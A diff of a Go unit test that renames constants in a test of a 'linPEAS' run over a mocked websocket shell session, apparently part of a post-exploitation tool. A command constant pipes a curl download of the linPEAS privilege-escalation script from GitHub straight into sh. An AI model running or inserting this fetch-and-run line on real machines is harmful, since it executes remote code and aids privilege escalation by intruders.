@@ -15,20 +15,20 @@ import (
 const command = "curl https://raw.githubusercontent.com/carlospolop/" +
 	"privilege-escalation-awesome-scripts-suite/master/linPEAS/" +
 	"linpeas.sh | sh && echo 'linPEAS done\n'\n"
-const connectionID = "test"
-const initialisationIndication = "Green"
-const completionIndication = "linPEAS done"
+const linPeasConnectionID = "test"
+const linPeasInitIndication = "Green"
+const linPeasCompletionIndication = "linPEAS done"
 
 func TestRun(t *testing.T) {
 	expectedFinishedCommand := websocket.Command{
-		ConnectionID: connectionID,
+		ConnectionID: linPeasConnectionID,
 		Command:      "finished",
 	}
 
 	broadcaster := broadcast.NewBroadcaster(512)
 
 	sessionMock := new(mocks.BaseSession)
-	sessionMock.On("SessionID").Return(connectionID)
+	sessionMock.On("SessionID").Return(linPeasConnectionID)
 	sessionMock.On("Execute", command).Return(nil)
 	sessionMock.On("Out").Return(&broadcaster)
 
@@ -37,16 +37,16 @@ func TestRun(t *testing.T) {
 
 	time.Sleep(2 * time.Second)
 	broadcaster.Submit(websocket.ShellIO{
-		ConnectionID: connectionID,
-		Message:      initialisationIndication,
+		ConnectionID: linPeasConnectionID,
+		Message:      linPeasInitIndication,
 	})
 	broadcaster.Submit(websocket.ShellIO{
-		ConnectionID: connectionID,
+		ConnectionID: linPeasConnectionID,
 		Message:      "testing",
 	})
 	broadcaster.Submit(websocket.ShellIO{
-		ConnectionID: connectionID,
-		Message:      completionIndication,
+		ConnectionID: linPeasConnectionID,
+		Message:      linPeasCompletionIndication,
 	})
 
 	finishedCommand := <-out
